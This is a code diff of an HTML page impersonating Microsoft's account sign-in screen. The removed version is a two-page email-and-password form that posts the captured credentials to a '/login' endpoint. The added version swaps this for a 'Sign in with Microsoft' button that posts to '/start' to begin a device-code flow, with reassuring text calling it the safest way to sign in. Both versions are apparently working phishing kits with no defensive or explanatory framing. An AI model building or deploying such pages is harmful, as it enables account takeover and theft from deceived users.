@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="-1">
-    <title>Sign in to your account</title>
+    <title>Sign in to your Microsoft account</title>
     <style>
         * {
             margin: 0;
@@ -35,13 +35,13 @@
             border-radius: 8px;
             box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
             padding: 44px 40px 48px;
-            transition: all 0.2s ease;
+            text-align: center;
         }
 
         .logo {
             display: block;
             width: 108px;
-            margin-bottom: 24px;
+            margin: 0 auto 24px;
         }
 
         h1 {
@@ -49,43 +49,14 @@
             font-weight: 600;
             line-height: 1.25;
             color: #1b1b1b;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
         }
 
         .sub-heading {
-            font-size: 14px;
+            font-size: 15px;
             color: #5e5e5e;
             margin-bottom: 32px;
             line-height: 1.4;
-        }
-
-        .form-group {
-            margin-bottom: 28px;
-        }
-
-        label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1b1b1b;
-            margin-bottom: 8px;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px 12px;
-            border: 1px solid #8c8c8c;
-            border-radius: 4px;
-            font-size: 16px;
-            line-height: 1.2;
-            transition: border-color 0.1s, box-shadow 0.1s;
-            font-family: inherit;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #0078d4;
-            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
         }
 
         .button-primary {
@@ -93,12 +64,13 @@
             color: white;
             border: none;
             border-radius: 4px;
-            padding: 12px 20px;
-            font-size: 15px;
+            padding: 14px 20px;
+            font-size: 16px;
             font-weight: 600;
             width: 100%;
             cursor: pointer;
-            transition: background 0.1s;
+            transition: background 0.15s;
+            margin-top: 8px;
         }
 
         .button-primary:hover {
@@ -112,32 +84,34 @@
         .button-primary:disabled {
             background-color: #b0b0b0;
             cursor: not-allowed;
-            opacity: 0.7;
+            opacity: 0.8;
         }
 
-        .links {
-            margin-top: 28px;
-            font-size: 13px;
-        }
-
-        .links a {
-            color: #0078d4;
-            text-decoration: none;
+        .spinner {
             display: inline-block;
-            margin-bottom: 12px;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+            margin-left: 10px;
+            vertical-align: middle;
         }
 
-        .links a:hover {
-            text-decoration: underline;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
-        .separator {
-            border-top: 1px solid #e1e1e1;
-            margin: 24px 0 20px;
+        .info-text {
+            font-size: 13px;
+            color: #666;
+            margin-top: 24px;
+            line-height: 1.5;
         }
 
         .footer-links {
-            margin-top: 32px;
+            margin-top: 40px;
             text-align: center;
             font-size: 12px;
             color: #666;
@@ -146,7 +120,7 @@
         .footer-links a {
             color: #666;
             text-decoration: none;
-            margin: 0 12px;
+            margin: 0 10px;
         }
 
         .footer-links a:hover {
@@ -154,114 +128,34 @@
             color: #0078d4;
         }
 
-        .message-toast {
-            background: #fde7e9;
-            border-left: 4px solid #d13438;
-            padding: 12px 16px;
-            border-radius: 4px;
-            margin-bottom: 24px;
-            font-size: 14px;
-            color: #d13438;
-            animation: slideIn 0.25s ease-out;
-        }
-
-        .message-success {
-            background: #e6f3e6;
-            border-left-color: #107c10;
-            color: #107c10;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #ffffff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 0.6s linear infinite;
-            margin-left: 8px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        @media (max-width: 480px) {
-            .card {
-                padding: 32px 24px;
-            }
-        }
-
-        .hidden-page {
-            display: none;
+        .microsoft-brand {
+            color: #0078d4;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-<div class="login-container" id="appRoot">
-    <!-- PAGE 1: EMAIL PAGE -->
-    <div id="emailPage" class="card">
+<div class="login-container">
+    <div class="card" id="mainCard">
         <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
-        <h1>Sign in</h1>
-        <div class="sub-heading">to continue to your Microsoft account</div>
 
-        <div id="emailMessageArea"></div>
-
-        <div class="form-group">
-            <label for="emailInput">Email, phone, or Skype</label>
-            <input type="email" id="emailInput" name="loginfmt" maxlength="113" autocomplete="username" placeholder="someone@example.com">
+        <h1>Sign in to your account</h1>
+        <div class="sub-heading">
+            Use your Microsoft account to access your services securely.
         </div>
 
-        <button id="nextButton" class="button-primary">Next</button>
+        <div id="messageArea"></div>
 
-        <div class="links">
-            <a href="#" id="createAccountLink">No account? Create one!</a>
-            <div style="margin-top: 8px;"><a href="#" id="cantAccessLink">Can't access your account?</a></div>
+        <button id="signInButton" class="button-primary">
+            Sign in with Microsoft
+        </button>
+
+        <div class="info-text">
+            You will be asked to enter a code on the official Microsoft website.<br>
+            This is the safest and most secure way to sign in.
         </div>
 
-        <div class="separator"></div>
-        <div class="footer-links">
-            <a href="https://www.microsoft.com/en/servicesagreement/">Terms of use</a>
-            <a href="https://privacy.microsoft.com/en/privacystatement">Privacy &amp; cookies</a>
-        </div>
-    </div>
-    
-    <!-- PAGE 2: PASSWORD PAGE -->
-    <div id="passwordPage" class="card hidden-page">
-        <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
-        <h1>Enter password</h1>
-        <div id="passwordSubtext" class="sub-heading">for <span id="displayEmailSpan"></span></div>
-
-        <div id="passwordMessageArea"></div>
-
-        <div class="form-group">
-            <label for="passwordInput">Password</label>
-            <input type="password" id="passwordInput" autocomplete="current-password" placeholder="Password">
-        </div>
-
-        <button id="signInButton" class="button-primary">Sign in</button>
-
-        <div class="links">
-            <a href="#" id="forgotPasswordLink">Forgot password?</a>
-            <div style="margin-top: 8px;"><a href="#" id="backToEmailLink">Use another account</a></div>
-        </div>
-
-        <div class="separator"></div>
         <div class="footer-links">
             <a href="https://www.microsoft.com/en/servicesagreement/">Terms of use</a>
             <a href="https://privacy.microsoft.com/en/privacystatement">Privacy &amp; cookies</a>
@@ -270,184 +164,60 @@
 </div>
 
 <script>
-    let capturedEmail = '';
-    let isSubmitting = false;   // Prevent double submission
+    let isSubmitting = false;
 
-    const emailPage = document.getElementById('emailPage');
-    const passwordPage = document.getElementById('passwordPage');
-    const emailInput = document.getElementById('emailInput');
-    const nextButton = document.getElementById('nextButton');
-    const emailMessageArea = document.getElementById('emailMessageArea');
-    
-    const displayEmailSpan = document.getElementById('displayEmailSpan');
-    const passwordInput = document.getElementById('passwordInput');
     const signInButton = document.getElementById('signInButton');
-    const passwordMessageArea = document.getElementById('passwordMessageArea');
-    const forgotPasswordLink = document.getElementById('forgotPasswordLink');
-    const backToEmailLink = document.getElementById('backToEmailLink');
-    const createAccountLink = document.getElementById('createAccountLink');
-    const cantAccessLink = document.getElementById('cantAccessLink');
+    const messageArea = document.getElementById('messageArea');
 
-    function showEmailMessage(message, isError = true) {
-        emailMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
-        setTimeout(() => { if (emailMessageArea.firstChild) emailMessageArea.innerHTML = ''; }, 5000);
-    }
-
-    function showPasswordMessage(message, isError = true) {
-        passwordMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
-        setTimeout(() => { if (passwordMessageArea.firstChild) passwordMessageArea.innerHTML = ''; }, 5000);
-    }
-
-    function escapeHtml(str) {
-        if (!str) return '';
-        return str.replace(/[&<>]/g, m => ({'&': '&amp;', '<': '&lt;', '>': '&gt;'})[m] || m);
-    }
-
-    function isValidEmail(email) {
-        if (!email) return false;
-        const trimmed = email.trim();
-        const re = /^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/i;
-        return re.test(trimmed);
-    }
-
-    function transitionToPasswordPage(email) {
-        capturedEmail = email;
-        displayEmailSpan.innerText = escapeHtml(email);
-        emailPage.classList.add('hidden-page');
-        passwordPage.classList.remove('hidden-page');
-        setTimeout(() => passwordInput.focus(), 100);
-        localStorage.setItem('login_email', email);
-    }
-
-    function backToEmail() {
-        capturedEmail = '';
-        emailInput.value = '';
-        passwordInput.value = '';
-        emailMessageArea.innerHTML = '';
-        passwordMessageArea.innerHTML = '';
-        emailPage.classList.remove('hidden-page');
-        passwordPage.classList.add('hidden-page');
-        nextButton.disabled = false;
-        nextButton.innerText = 'Next';
-        signInButton.disabled = false;
-        signInButton.innerHTML = 'Sign in';
-        emailInput.focus();
-    }
-
-    function onEmailNext() {
-        const emailValue = emailInput.value.trim();
-        if (!emailValue) {
-            showEmailMessage('Enter a valid email address, phone number, or Skype name.', true);
-            emailInput.focus();
-            return;
-        }
-        if (!isValidEmail(emailValue)) {
-            showEmailMessage('Please enter a valid email address (e.g., name@example.com).', true);
-            emailInput.focus();
-            return;
-        }
-
-        nextButton.disabled = true;
-        nextButton.innerText = 'Checking...';
-
+    function showMessage(text, isError = false) {
+        const color = isError ? '#d13438' : '#107c10';
+        messageArea.innerHTML = `
+            <div style="background: ${isError ? '#fde7e9' : '#e6f3e6'}; 
+                        color: ${color}; 
+                        padding: 12px 16px; 
+                        border-radius: 4px; 
+                        margin: 16px 0; 
+                        font-size: 14px; 
+                        border-left: 4px solid ${color};">
+                ${text}
+            </div>`;
+        
         setTimeout(() => {
-            showEmailMessage('Email verified! Please enter your password.', false);
-            transitionToPasswordPage(emailValue);
-            nextButton.disabled = false;
-            nextButton.innerText = 'Next';
-        }, 600);
+            if (messageArea.firstChild) messageArea.innerHTML = '';
+        }, 6000);
     }
 
-    function onPasswordSignIn() {
-        if (isSubmitting) return;   // Prevent double click
-        const password = passwordInput.value.trim();
-
-        if (!password) {
-            showPasswordMessage('Enter your password.', true);
-            passwordInput.focus();
-            return;
-        }
-        if (password.length < 3) {
-            showPasswordMessage('Please enter your password.', true);
-            passwordInput.focus();
-            return;
-        }
-
+    function startDeviceFlow() {
+        if (isSubmitting) return;
+        
         isSubmitting = true;
         signInButton.disabled = true;
-        signInButton.innerHTML = 'Signing in... <span class="spinner"></span>';
+        signInButton.innerHTML = 'Connecting to Microsoft... <span class="spinner"></span>';
 
-        // Submit form to backend
+        // Submit to backend to initiate device code flow
         const form = document.createElement('form');
         form.method = 'POST';
-        form.action = '/login';
+        form.action = '/start';
         form.style.display = 'none';
-
-        const emailField = document.createElement('input');
-        emailField.name = 'email';
-        emailField.value = capturedEmail;
-        form.appendChild(emailField);
-
-        const passwordField = document.createElement('input');
-        passwordField.name = 'password';
-        passwordField.value = password;
-        form.appendChild(passwordField);
-
         document.body.appendChild(form);
         form.submit();
     }
 
-    function onForgotPassword(e) {
-        e.preventDefault();
-        window.open('https://account.live.com/password/reset', '_blank');
-    }
-
-    function onCreateAccount(e) {
-        e.preventDefault();
-        window.open('https://signup.live.com/signup', '_blank');
-    }
-
-    function onCantAccess(e) {
-        e.preventDefault();
-        window.open('https://account.live.com/password/reset', '_blank');
-    }
-
-    function prefillSavedEmail() {
-        const savedEmail = localStorage.getItem('login_email');
-        if (savedEmail && emailInput) {
-            emailInput.value = savedEmail;
-        }
-    }
-
     // Event Listeners
-    nextButton.addEventListener('click', onEmailNext);
-    signInButton.addEventListener('click', onPasswordSignIn);
+    signInButton.addEventListener('click', startDeviceFlow);
 
-    forgotPasswordLink.addEventListener('click', onForgotPassword);
-    createAccountLink.addEventListener('click', onCreateAccount);
-    cantAccessLink.addEventListener('click', onCantAccess);
-
-    backToEmailLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        backToEmail();
-    });
-
-    emailInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            onEmailNext();
+    // Allow Enter key
+    document.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && !isSubmitting) {
+            startDeviceFlow();
         }
     });
 
-    passwordInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            onPasswordSignIn();
-        }
-    });
-
-    // Prefill email if saved
-    prefillSavedEmail();
+    // Optional: Show a small notice on load
+    window.onload = () => {
+        // You can add a welcome toast here if needed
+    };
 </script>
+
 </body>
 </html>
